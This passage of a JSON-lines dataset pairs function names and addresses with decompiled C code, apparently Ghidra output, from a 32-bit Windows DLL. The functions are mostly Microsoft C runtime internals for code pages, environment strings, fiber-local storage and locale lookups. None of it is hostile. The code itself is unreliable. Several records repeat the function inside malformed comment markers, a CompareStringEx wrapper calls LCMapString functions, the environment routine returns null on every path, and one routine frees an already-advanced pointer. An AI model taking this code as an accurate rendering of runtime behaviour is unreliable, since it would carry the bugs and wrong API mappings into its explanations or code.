loopIndex++) {\n                characterData[loopIndex] = ' '; \n            }\n            leadBytePtr += 2; \n            codePageInfo.LeadByte[0] = *leadBytePtr; \n        }\n        \n        ___acrt_GetStringTypeA((__acrt_ptd **)0x0, 1, characterData, 0x100, stringTypeInfo, *(UINT *)(multibyteData + 4), 0);\n        \n        ___acrt_LCMapStringA((__acrt_ptd **)0x0, *(wchar_t **)(multibyteData + 0x21c), 0x100, characterData, 0x100, (char *)mappedMultibyteData1, 0x100, *(int *)(multibyteData + 4), 0);\n        \n        ___acrt_LCMapStringA((__acrt_ptd **)0x0, *(wchar_t **)(multibyteData + 0x21c), 0x200, characterData, 0x100, (char *)mappedMultibyteData2, 0x100, *(int *)(multibyteData + 4), 0);\n        \n        \n        for (loopIndex = 0; loopIndex < 0x100; loopIndex++) {\n            if ((stringTypeInfo[loopIndex] & 1) == 0) { \n                if ((stringTypeInfo[loopIndex] & 2) != 0) { \n                    multibyteData[loopIndex + 0x19] = (__crt_multibyte_data)((byte)multibyteData[loopIndex + 0x19] | 0x20); \n                    multibyteData[loopIndex + 0x119] = mappedMultibyteData2[loopIndex]; \n                } else {\n                    multibyteData[loopIndex + 0x119] = (__crt_multibyte_data)0x0; \n                }\n            } else {\n                multibyteData[loopIndex + 0x19] = (__crt_multibyte_data)((byte)multibyteData[loopIndex + 0x19] | 0x10); \n                multibyteData[loopIndex + 0x119] = mappedMultibyteData1[loopIndex]; \n            }\n        }\n    } else {\n        \n        for (loopIndex = 0; loopIndex < 0x100; loopIndex++) {\n            currentMultibyteData = multibyteData + loopIndex + 0x119; \n            \n            if (currentMultibyteData + (-0x61 - (int)(multibyteData + 0x119)) + 0x20 < (__crt_multibyte_data *)0x1a) {\n                multibyteData[loopIndex + 0x19] = (__crt_multibyte_data)((byte)multibyteData[loopIndex + 0x19] | 0x10); \n                multibyteData[loopIndex + 0x119] = (__crt_multibyte_data)((char)loopIndex + ' '); \n            } else if (currentMultibyteData + (-0x61 - (int)(multibyteData + 0x119)) < (__crt_multibyte_data *)0x1a) {\n                multibyteData[loopIndex + 0x19] = (__crt_multibyte_data)((byte)multibyteData[loopIndex + 0x19] | 0x20); \n                multibyteData[loopIndex + 0x119] = (__crt_multibyte_data)((char)loopIndex - 0x20); \n            } else {\n                multibyteData[loopIndex + 0x119] = (__crt_multibyte_data)0x0; \n            }\n        }\n    }\n    \n    ___security_check_cookie_4(stackSecurityCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1002c7e0", "Address": "1002c7e0", "Source Code": "int __cdecl FUN_1002c7e0(int input_param, char flag, int data_param, int **pointer_param)\n{\n    int temp_value; \n    int *int_pointer; \n    undefined4 *allocated_memory; \n    int copy_count; \n    undefined4 *source_memory; \n    \n    FUN_1002c8ed(data_param, *pointer_param);\n    \n    \n    if ((int ***)getSystemCP(input_param) == *(int ****)(*(int *)(data_param + 0x48) + 4)) {\n        return 0; \n    }\n    \n    \n    allocated_memory = (undefined4 *)__malloc_base(0x220);\n    if (allocated_memory != (undefined4 *)0x0) { \n        source_memory = *(undefined4 **)(data_param + 0x48); \n        \n        for (copy_count = 0x88; copy_count != 0; copy_count--) {\n            *allocated_memory++ = *source_memory++; \n        }\n        *allocated_memory = 0; \n        \n        \n        copy_count = __setmbcp_nolock((int)getSystemCP(input_param), (__crt_multibyte_data *)allocated_memory);\n        if (copy_count != -1) { \n            if (flag == '\\0') { \n                FUN_1002a316(); \n            }\n            int_pointer = *(int **)(data_param + 0x48); \n            LOCK(); \n            temp_value = *int_pointer; \n            *int_pointer = *int_pointer - 1; \n            UNLOCK(); \n            \n            \n            if ((temp_value == 1) && (*(undefined **)(data_param + 0x48) != &DAT_1004e5e8)) {\n                FID_conflict__free(*(void **)(data_param + 0x48)); \n            }\n            *allocated_memory = 1; \n            *(undefined4 **)(data_param + 0x48) = allocated_memory; \n            \n            \n            if (((*(byte *)(data_param + 0x350) & 2) == 0) && (((byte)DAT_1004e808 & 1) == 0)) {\n                __acrt_lock_and_call<>(5, (void *)&data_param); \n                if (flag != '\\0') { \n                    PTR_DAT_1004e2ac = (undefined *)*pointer_param; \n                }\n            }\n            goto LAB_1002c859; \n        }\n        source_memory = (undefined4 *)FUN_100253b8(); \n        *source_memory = 0x16; \n    }\n    copy_count = -1; \nLAB_1002c859:\n    FID_conflict__free(source_memory); \n    return copy_count; \n}"}
{"Function Name": "FUN_1002c8ed", "Address": "1002c8ed", "Source Code": "int * __cdecl FUN_1002c8ed(int input_param, int *memory_pointer)\n{\n    int temp_value; \n    int *current_memory; \n    \n    \n    if (((*(uint *)(input_param + 0x350) & DAT_1004e808) == 0) || (*(int *)(input_param + 0x4c) == 0)) {\n        ___acrt_lock(5); \n        current_memory = *(int **)(input_param + 0x48); \n        \n        if (current_memory != memory_pointer) {\n            \n            if (current_memory != (int *)0x0) {\n                LOCK(); \n                temp_value = *current_memory; \n                *current_memory = temp_value - 1; \n                UNLOCK(); \n                \n                if ((temp_value - 1 == 0) && (current_memory != (int *)&DAT_1004e5e8)) {\n                    FID_conflict__free(current_memory); \n                }\n            }\n            *(int **)(input_param + 0x48) = memory_pointer; \n            LOCK(); \n            *memory_pointer = *memory_pointer + 1; \n            UNLOCK(); \n            current_memory = memory_pointer; \n        }\n        FUN_1002c96f(); \n    } else {\n        current_memory = *(int **)(input_param + 0x48); \n    }\n    \n    \n    if (current_memory == (int *)0x0) {\n        _abort(); \n    }\n    \n    return current_memory; \n}"}
{"Function Name": "__setmbcp_nolock", "Address": "1002c9e1", "Source Code": "void __cdecl __setmbcp_nolock(int codePageInput, __crt_multibyte_data *multibyteData)\n{\n    uint systemCodePage; \n    uint index; \n    uint loopCounter; \n    int currentIndex; \n    _cpinfo codePageInfo; \n    uint securityCookie; \n    securityCookie = securityCookieBase ^ (uint)&stack0xfffffffc; \n    systemCodePage = getSystemCP(codePageInput); \n    if (systemCodePage != 0) { \n        loopCounter = 0; \n        index = 0; \n        currentIndex = 0; \n    LAB_1002ca1f:\n        if (*(uint *)((int)&codePageArray + index) != systemCodePage) \n            goto code_r0x1002ca2b; \n        _memset(multibyteData + 0x18, 0, 0x101); \n        byte *currentCodePageData = &codePageDataBase + currentIndex * 0x30; \n        do {\n            byte firstByte = *currentCodePageData; \n            while ((firstByte != 0 && (firstByte = currentCodePageData[1], firstByte != 0))) { \n                for (index = (uint)*currentCodePageData; (index <= firstByte && (index < 0x100)); index++) { \n                    multibyteData[index + 0x19] = (__crt_multibyte_data)((byte)multibyteData[index + 0x19] | (&DAT_1004e4f0)[loopCounter]);\n                    firstByte = currentCodePageData[1]; \n                }\n                currentCodePageData += 2; \n            }\n            loopCounter++; \n            currentCodePageData += 8; \n        } while (loopCounter < 4); \n        *(uint *)(multibyteData + 4) = systemCodePage; \n        *(undefined4 *)(multibyteData + 8) = 1; \n        wchar_t *localeName = CPtoLocaleName(systemCodePage); \n        *(wchar_t **)(multibyteData + 0x21c) = localeName; \n        undefined2 *leadByteArrayPointer = (undefined2 *)(multibyteData + 0xc); \n        undefined2 *currentLeadByteDataPointer = (undefined2 *)(&DAT_1004e4fc + currentIndex * 0x30); \n        for (int leadByteCounter = 6; leadByteCounter > 0; leadByteCounter--) { \n            *leadByteArrayPointer++ = *currentLeadByteDataPointer++; \n        }\n        goto LAB_1002cbb8; \n    }\n    setSBCS(multibyteData); \nLAB_1002cbc2:\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \ncode_r0x1002ca2b:\n    currentIndex++; \n    index += 0x30; \n    if (0xef < index) \n        goto code_r0x1002ca39; \n    goto LAB_1002ca1f; \ncode_r0x1002ca39:\n    if (((systemCodePage != 65000) && (systemCodePage != 0xfde9)) && IsValidCodePage(systemCodePage & 0xffff)) { \n        if (GetCPInfo(systemCodePage, &codePageInfo) == 0) { \n            if (specificConditionFlag != 0) { \n                setSBCS(multibyteData); \n            }\n        } else {\n            _memset(multibyteData + 0x18, 0, 0x101); \n            *(uint *)(multibyteData + 4) = systemCodePage; \n            *(undefined4 *)(multibyteData + 0x21c) = 0; \n            if (codePageInfo.MaxCharSize < 2) { \n                *(undefined4 *)(multibyteData + 8) = 0; \n            } else {\n                byte *leadBytePointer = codePageInfo.LeadByte; \n                while ((codePageInfo.LeadByte[0] != 0 && (byte firstByte = leadBytePointer[1], firstByte != 0))) { \n                    for (systemCodePage = (uint)*leadBytePointer; systemCodePage <= firstByte; systemCodePage++) { \n                        multibyteData[systemCodePage + 0x19] = (__crt_multibyte_data)((byte)multibyteData[systemCodePage + 0x19] | 4);\n                    }\n                    leadBytePointer += 2; \n                    codePageInfo.LeadByte[0] = *leadBytePointer; \n                }\n                __crt_multibyte_data *multibyteDataPointer = multibyteData + 0x1a; \n                for (int leadByteCounter = 0xfe; leadByteCounter > 0; leadByteCounter--) { \n                    *multibyteDataPointer++ = (__crt_multibyte_data)((byte)*multibyteDataPointer | 8); \n                }\n                localeName = CPtoLocaleName(*(int *)(multibyteData + 4)); \n                *(wchar_t **)(multibyteData + 0x21c) = localeName; \n                *(undefined4 *)(multibyteData + 8) = 1; \n            }\n            *(undefined4 *)(multibyteData + 0xc) = 0; \n            *(undefined4 *)(multibyteData + 0x10) = 0; \n            *(undefined4 *)(multibyteData + 0x14) = 0; \n        }\n    }\nLAB_1002cbb8:\n    setSBUpLow(multibyteData); \n}"}
{"Function Name": "x_ismbbtype_l", "Address": "1002cbd2", "Source Code": "int __cdecl x_ismbbtype_l(__crt_locale_pointers *locale_pointers, uint byte_index, int check_value, int mask_value)\n{\n    uint intermediate_result; \n    int return_value;  \n    int locale_data; \n    \n    FUN_1001bfff(&locale_data, (__acrt_ptd **)locale_pointers);\n    \n    \n    if ((*(byte *)(locale_data + 0x19 + (byte_index & 0xff)) & (byte)mask_value) == 0) {\n        \n        if (check_value == 0) {\n            intermediate_result = 0;\n        } else {\n            \n            intermediate_result = (uint)*(ushort *)(*(int *)(locale_data + 0x10) + (byte_index & 0xff) * 2) & check_value;\n        }\n        \n        if (intermediate_result == 0) {\n            return 0;\n        }\n    }\n    \n    return_value = 1; \n    *(uint *)(locale_data + 0x350) &= 0xfffffffd; \n    return return_value; \n}"}
{"Function Name": "__ismbblead", "Address": "1002cc2b", "Source Code": "int __cdecl __ismbblead(uint characterCode)\n{\n    \n    return checkMultibyteType((__crt_locale_pointers *)0x0, characterCode, 0, 4);\n}"}
{"Function Name": "find_end_of_double_null_terminated_sequence", "Address": "1002cc5c", "Source Code": "\\*\nwchar_t * __cdecl find_end_of_double_null_terminated_sequence(wchar_t *input_sequence)\n{\n    wchar_t *current_position; \n    \n    while (*input_sequence != L'\\0') {\n        current_position = input_sequence; \n        \n        \n        while (*current_position != L'\\0') {\n            current_position++; \n        }\n        \n        input_sequence = current_position + 1; \n    }\n    \n    return input_sequence; \n}\n*\\ \n \nwchar_t * __cdecl find_end_of_double_null_terminated_sequence(wchar_t *input_sequence)\n{\n    wchar_t *current_position;\n    while (*input_sequence != L'\\0') {\n        current_position = input_sequence;\n        while (*current_position != L'\\0') {\n            current_position++;\n        }\n        input_sequence = current_position + 1;\n    }\n    return input_sequence;\n}"}
{"Function Name": "___dcrt_get_narrow_environment_from_os", "Address": "1002cc93", "Source Code": "LPSTR ___dcrt_get_narrow_environment_from_os(void)\n{\n    LPWCH wideCharEnvStrings; \n    size_t multiByteSize;  \n    LPSTR multiByteEnvStr; \n    int wideCharLength; \n    LPSTR returnMultiByteStr; \n    wideCharEnvStrings = GetEnvironmentStringsW(); \n    if (wideCharEnvStrings != (LPWCH)0x0) { \n        wideCharLength = (int)find_end_of_double_null_terminated_sequence(wideCharEnvStrings) - (int)wideCharEnvStrings >> 1; \n        multiByteSize = WideCharToMultiByte(0, 0, wideCharEnvStrings, wideCharLength, (LPSTR)0x0, 0, (LPCSTR)0x0, (LPBOOL)0x0); \n        if (multiByteSize != 0) { \n            multiByteEnvStr = (LPSTR)__malloc_base(multiByteSize); \n            if (multiByteEnvStr != (LPSTR)0x0) { \n                if (WideCharToMultiByte(0, 0, wideCharEnvStrings, wideCharLength, multiByteEnvStr, multiByteSize, (LPCSTR)0x0, (LPBOOL)0x0) != 0) { \n                    returnMultiByteStr = multiByteEnvStr; \n                    multiByteEnvStr = (LPSTR)0x0; \n                } else {\n                    goto LAB_1002ccf5; \n                }\n            } else {\n            LAB_1002ccf5:\n                returnMultiByteStr = (LPSTR)0x0; \n            }\n        }\n    }\n    returnMultiByteStr = (LPSTR)0x0; \nLAB_1002cd02:\n    if (wideCharEnvStrings != (LPWCH)0x0) { \n        FreeEnvironmentStringsW(wideCharEnvStrings); \n    }\n    return returnMultiByteStr; \n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>_>", "Address": "1002cda7", "Source Code": "\\*\nint __cdecl\n__acrt_lock_and_call<class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>_>\n(__acrt_lock_id param_1,<lambda_a463b7b0560cfcaf9b17f27c6ef46564> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_9227be29367c048ad7fd93a717dcb1a1>,class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>&,class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f>_>\n        (&local_5, \n         (class_<lambda_9227be29367c048ad7fd93a717dcb1a1> *)&param_1, \n         param_2, \n         (class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f> *)&param_1); \n}\n*\\ \n \nint __cdecl\n__acrt_lock_and_call<class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>_>\n(__acrt_lock_id param_1,<lambda_a463b7b0560cfcaf9b17f27c6ef46564> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_9227be29367c048ad7fd93a717dcb1a1>,class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>&,class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f>_>\n        (&local_5, (class_<lambda_9227be29367c048ad7fd93a717dcb1a1> *)&param_1, param_2, (class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f> *)&param_1);\n}"}
{"Function Name": "try_get_first_available_module", "Address": "1002cf33", "Source Code": "\\*\nHINSTANCE__ * __cdecl try_get_first_available_module(module_id *module_id_1,module_id *module_id_2)\n{\n    HINSTANCE__ **module_handle_pointer; \n    HINSTANCE__ *loaded_library_handle; \n    LPCWSTR library_file_name; \n    do {\n        if (module_id_1 == module_id_2) { \n            return (HINSTANCE__ *)0x0; \n        }\n        module_handle_pointer = (HINSTANCE__ **)(&DAT_100502b8 + *module_id_1); \n        loaded_library_handle = *module_handle_pointer; \n        if (loaded_library_handle == (HINSTANCE__ *)0x0) { \n            library_file_name = (LPCWSTR)(&PTR_u_api_ms_win_core_datetime_l1_1_1_1003ffd8)[*module_id_1]; \n            loaded_library_handle = LoadLibraryExW(library_file_name,(HANDLE)0x0,0x800); \n            if (loaded_library_handle == (HMODULE)0x0) { \n                if (GetLastError() == 0x57 && _wcsncmp(library_file_name,L\"api-ms-\",7) != 0 && \n                    _wcsncmp(library_file_name,L\"ext-ms-\",7) != 0) {\n                    loaded_library_handle = LoadLibraryExW(library_file_name,(HANDLE)0x0,0); \n                }\n                else {\n                    loaded_library_handle = (HMODULE)0x0; \n                }\n                if (loaded_library_handle == (HMODULE)0x0) { \n                    LOCK(); \n                    *module_handle_pointer = (HINSTANCE__ *)0xffffffff; \n                    UNLOCK(); \n                    goto LAB_1002cfe2; \n                }\n            }\n            LOCK(); \n            *module_handle_pointer = loaded_library_handle; \n            UNLOCK(); \n            if (loaded_library_handle != (HINSTANCE__ *)0x0) { \n                FreeLibrary(loaded_library_handle); \n            }\n        }\nLAB_1002cfde: \n        if (loaded_library_handle != (HINSTANCE__ *)0x0) { \n            return loaded_library_handle; \n        }\nLAB_1002cfe2: \n        module_id_1 = module_id_1 + 1; \n    } while (true); \n}\n*\\ \n \nHINSTANCE__ * __cdecl try_get_first_available_module(module_id *module_id_1,module_id *module_id_2)\n{\nHINSTANCE__ **module_handle_pointer;\nHINSTANCE__ *loaded_library_handle;\nLPCWSTR library_file_name;\ndo {\n    if (module_id_1 == module_id_2) {\n        return (HINSTANCE__ *)0x0;\n    }\n    module_handle_pointer = (HINSTANCE__ **)(&DAT_100502b8 + *module_id_1);\n    loaded_library_handle = *module_handle_pointer;\n    if (loaded_library_handle == (HINSTANCE__ *)0x0) {\n        library_file_name = (LPCWSTR)(&PTR_u_api_ms_win_core_datetime_l1_1_1_1003ffd8)[*module_id_1];\n        loaded_library_handle = LoadLibraryExW(library_file_name,(HANDLE)0x0,0x800);\n        if (loaded_library_handle == (HMODULE)0x0) {\n            if (GetLastError() == 0x57 && _wcsncmp(library_file_name,L\"api-ms-\",7) != 0 &&\n                _wcsncmp(library_file_name,L\"ext-ms-\",7) != 0) {\n                loaded_library_handle = LoadLibraryExW(library_file_name,(HANDLE)0x0,0);\n            }\n            else {\n                loaded_library_handle = (HMODULE)0x0;\n            }\n            if (loaded_library_handle == (HMODULE)0x0) {\n                LOCK();\n                *module_handle_pointer = (HINSTANCE__ *)0xffffffff;\n                UNLOCK();\n                goto LAB_1002cfe2;\n            }\n        }\n        LOCK();\n        *module_handle_pointer = loaded_library_handle;\n        UNLOCK();\n        if (loaded_library_handle != (HINSTANCE__ *)0x0) {\n            FreeLibrary(loaded_library_handle);\n        }\n    }\nLAB_1002cfde:\n    if (loaded_library_handle != (HINSTANCE__ *)0x0) {\n        return loaded_library_handle;\n    }\nLAB_1002cfe2:\n    module_id_1 = module_id_1 + 1;\n} while (true);\n}"}
{"Function Name": "try_get_function", "Address": "1002cffb", "Source Code": "void * __cdecl\ntry_get_function(function_id param_1, char *param_2, module_id *param_3, module_id *param_4)\n{\n    \n    uint *puVar1 = &DAT_10050308 + param_1;\n    \n    byte bVar3 = (byte)DAT_1004e008 & 0x1f;\n    \n    FARPROC pFVar4 = (FARPROC)((DAT_1004e008 ^ *puVar1) >> bVar3 | (DAT_1004e008 ^ *puVar1) << 0x20 - bVar3);\n    \n    if (pFVar4 == (FARPROC)0xffffffff) {\n        \n        pFVar4 = (FARPROC)0x0;\n    } else if (pFVar4 == (FARPROC)0x0) {\n        \n        HINSTANCE__ *hModule = try_get_first_available_module(param_3, param_4);\n        \n        if (hModule == (HINSTANCE__ *)0x0 || (pFVar4 = GetProcAddress(hModule, param_2), pFVar4 == (FARPROC)0x0)) {\n            \n            bVar3 = 0x20 - ((byte)DAT_1004e008 & 0x1f) & 0x1f;\n            \n            LOCK();\n            \n            *puVar1 = (0xffffffffU >> bVar3 | -1 << 0x20 - bVar3) ^ DAT_1004e008;\n            \n            UNLOCK();\n            \n            pFVar4 = (FARPROC)0x0;\n        } else {\n            \n            LOCK();\n            \n            *puVar1 = __crt_fast_encode_pointer<>((uint)pFVar4);\n            \n            UNLOCK();\n        }\n    }\n    \n    return pFVar4;\n}"}
{"Function Name": "FUN_1002d07d", "Address": "1002d07d", "Source Code": "void FUN_1002d07d(undefined4 input_param)\n{\n    uint security_check_result; \n    code *function_pointer; \n    \n    security_check_result = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    function_pointer = (code *)try_get_function(0x1c, \"AppPolicyGetProcessTerminationMethod\", (module_id *)&DAT_10040650, (module_id *)\"AppPolicyGetProcessTerminationMethod\");\n    \n    if (function_pointer != (code *)0x0) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(0xfffffffa, input_param);\n        \n        \n        (*function_pointer)();\n    }\n    \n    ___security_check_cookie_4(security_check_result ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "FUN_1002d0d4", "Address": "1002d0d4", "Source Code": "void FUN_1002d0d4(_func_int_wchar_t_ptr_ulong_long *locale_function_pointer, ulong locale_id, long locale_data, void *user_data)\n{\n    \n    _func_int__func_int_wchar_t_ptr_ulong_long_ptr_ulong_long_void_ptr *locale_enum_function;\n    \n    \n    ulong locale_id_copy = locale_id; \n    long locale_data_copy = locale_data;  \n    void *user_data_copy = user_data; \n    \n    locale_enum_function = try_get_EnumSystemLocalesEx();\n    \n    \n    if (locale_enum_function == (_func_int__func_int_wchar_t_ptr_ulong_long_ptr_ulong_long_void_ptr *)0x0) {\n        \n        __acrt_lock_and_call<class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>>(4, (<lambda_a463b7b0560cfcaf9b17f27c6ef46564> *)&locale_function_pointer);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        \n        (*locale_enum_function)(locale_function_pointer, locale_id_copy, locale_data_copy, user_data_copy);\n    }\n    \n    \n    return;\n}"}
{"Function Name": "___acrt_FlsAlloc@4", "Address": "1002d12d", "Source Code": "void ___acrt_FlsAlloc_4(undefined4 functionParameter)\n{\n    uint securityCookieValue; \n    code *flsAllocFunctionPointer; \n    \n    securityCookieValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    flsAllocFunctionPointer = (code *)try_get_function(3, \"FlsAlloc\", (module_id *)&DAT_10040508, (module_id *)\"FlsAlloc\");\n    \n    \n    if (flsAllocFunctionPointer == (code *)0x0) {\n        \n        TlsAlloc();\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(functionParameter);\n        \n        (*flsAllocFunctionPointer)();\n    }\n    \n    \n    ___security_check_cookie_4(securityCookieValue ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "___acrt_FlsFree@4", "Address": "1002d183", "Source Code": "void ___acrt_FlsFree_4(DWORD input_param)\n{\n    uint security_value; \n    code *function_pointer; \n    \n    security_value = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    function_pointer = (code *)try_get_function(4, \"FlsFree\", (module_id *)&DAT_1004051c, (module_id *)\"FlsFree\");\n    \n    if (function_pointer == (code *)0x0) {\n        \n        TlsFree(input_param);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*function_pointer)();\n    }\n    \n    ___security_check_cookie_4(security_value ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "___acrt_FlsGetValue@4", "Address": "1002d1d9", "Source Code": "void ___acrt_FlsGetValue_4(DWORD thread_id) \n{\n    code *function_pointer; \n    \n    function_pointer = (code *)try_get_function(5,\"FlsGetValue\",(module_id *)&DAT_1004052c,\n(module_id *)\"FlsGetValue\");\n    \n    \n    if (function_pointer == (code *)0x0) {\n        \n        TlsGetValue(thread_id);\n    }\n    else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*function_pointer)();\n    }\n    return; \n}"}
{"Function Name": "___acrt_FlsSetValue@8", "Address": "1002d22f", "Source Code": "void ___acrt_FlsSetValue_8(DWORD thread_id, LPVOID value)\n{\n    \n    uint unique_value = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    code *fls_set_value_func = (code *)try_get_function(6, \"FlsSetValue\", (module_id *)&DAT_10040540, (module_id *)\"FlsSetValue\");\n    \n    \n    if (fls_set_value_func == (code *)0x0) {\n        \n        TlsSetValue(thread_id, value);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*fls_set_value_func)();\n    }\n    \n    \n    ___security_check_cookie_4(unique_value ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "FUN_1002d288", "Address": "1002d288", "Source Code": "void FUN_1002d288(wchar_t *localeString, ulong localeType, wchar_t *localeInfoBuffer, int bufferSize)\n{\n    uint securityCookie;  \n    _func_int_wchar_t_ptr_ulong_wchar_t_ptr_int *getLocaleInfoFunction;  \n    LCID localeIdentifier;  \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;  \n    getLocaleInfoFunction = try_get_GetLocaleInfoEx();  \n    if (getLocaleInfoFunction == (_func_int_wchar_t_ptr_ulong_wchar_t_ptr_int *)0x0) {  \n        localeIdentifier = FUN_1002d4ac(localeString, 0);  \n        GetLocaleInfoW(localeIdentifier, localeType, localeInfoBuffer, bufferSize);  \n    } else {\n        (*(code *)PTR__guard_check_icall_1003a2f8)();  \n        (*getLocaleInfoFunction)(localeString, localeType, localeInfoBuffer, bufferSize);  \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);  \n}"}
{"Function Name": "FUN_1002d2de", "Address": "1002d2de", "Source Code": "void FUN_1002d2de(wchar_t *locale_name, rsize_t locale_name_length)\n{\n    uint security_cookie;  \n    _func_int_wchar_t_ptr_int *locale_function_pointer;  \n    LCID locale_id;  \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    locale_function_pointer = try_get_GetUserDefaultLocaleName();\n    \n    \n    if (locale_function_pointer == (_func_int_wchar_t_ptr_int *)0x0) {\n        \n        locale_id = GetUserDefaultLCID();\n        \n        FUN_1002d3e2(locale_id, locale_name, locale_name_length, 0);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*locale_function_pointer)(locale_name, locale_name_length);\n    }\n    \n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return;  \n}"}
{"Function Name": "___acrt_InitializeCriticalSectionEx@12", "Address": "1002d331", "Source Code": "void ___acrt_InitializeCriticalSectionEx_12\n(LPCRITICAL_SECTION param_1, DWORD param_2, undefined4 param_3)\n{\n    uint uVar1; \n    code *pcVar2; \n    \n    uVar1 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    pcVar2 = (code *)try_get_function(0x12, \"InitializeCriticalSectionEx\", (module_id *)&DAT_100405c0, (module_id *)\"InitializeCriticalSectionEx\");\n    \n    \n    if (pcVar2 == (code *)0x0) {\n        \n        InitializeCriticalSectionAndSpinCount(param_1, param_2);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, param_2, param_3);\n        \n        (*pcVar2)();\n    }\n    \n    \n    ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "FUN_1002d393", "Address": "1002d393", "Source Code": "void FUN_1002d393(wchar_t *localeName) \n{\n    uint securityCookie; \n    _func_int_wchar_t_ptr *localeValidationFunction; \n    LCID localeIdentifier; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    localeValidationFunction = try_get_IsValidLocaleName(); \n    if (localeValidationFunction == (_func_int_wchar_t_ptr *)0x0) { \n        localeIdentifier = FUN_1002d4ac(localeName, 0); \n        IsValidLocale(localeIdentifier, 1); \n    } else { \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*localeValidationFunction)(localeName); \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1002d3e2", "Address": "1002d3e2", "Source Code": "void FUN_1002d3e2(ulong lParam, wchar_t *localeName, rsize_t nameSize, ulong lParam2)\n{\n    uint securityCookie;  \n    _func_int_ulong_wchar_t_ptr_int_ulong *localeNameConverter;  \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;  \n    localeNameConverter = try_get_LCIDToLocaleName();  \n    if (localeNameConverter == (_func_int_ulong_wchar_t_ptr_int_ulong *)0x0) {  \n        ___acrt_DownlevelLCIDToLocaleName(lParam, localeName, nameSize);  \n    } else {\n        (*(code *)PTR__guard_check_icall_1003a2f8)();  \n        (*localeNameConverter)(lParam, localeName, nameSize, lParam2);  \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);  \n}"}
{"Function Name": "___acrt_CompareStringEx@36", "Address": "1002d438", "Source Code": "void ___acrt_CompareStringEx_36\n(wchar_t *param_1, ulong param_2, wchar_t *param_3, int param_4, wchar_t *param_5,\n int param_6, _nlsversioninfo *param_7, void *param_8, long param_9)\n{\n    \n    uint uVar1 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    _func_int_wchar_t_ptr_ulong_wchar_t_ptr_int_wchar_t_ptr_int__nlsversioninfo_ptr_void_ptr_long *p_Var2 = try_get_LCMapStringEx();\n    LCID Locale;\n    \n    if (p_Var2 == (_func_int_wchar_t_ptr_ulong_wchar_t_ptr_int_wchar_t_ptr_int__nlsversioninfo_ptr_void_ptr_long *)0x0) {\n        \n        Locale = FUN_1002d4ac(param_1, 0);\n        LCMapStringW(Locale, param_2, param_3, param_4, param_5, param_6);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        (*p_Var2)(param_1, param_2, param_3, param_4, param_5, param_6, param_7, param_8, param_9);\n    }\n    \n    ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1002d4ac", "Address": "1002d4ac", "Source Code": "void FUN_1002d4ac(wchar_t *locale_name, ulong lcid_value)\n{\n    uint security_cookie;  \n    _func_ulong_wchar_t_ptr_ulong *locale_to_lcid_func;  \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;  \n    locale_to_lcid_func = try_get_LocaleNameToLCID();  \n    if (locale_to_lcid_func == (_func_ulong_wchar_t_ptr_ulong *)0x0) {  \n        ___acrt_DownlevelLocaleNameToLCID(locale_name);  \n    } else {\n        (*(code *)PTR__guard_check_icall_1003a2f8)();  \n        (*locale_to_lcid_func)(locale_name, lcid_value);  \n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);  \n}"}
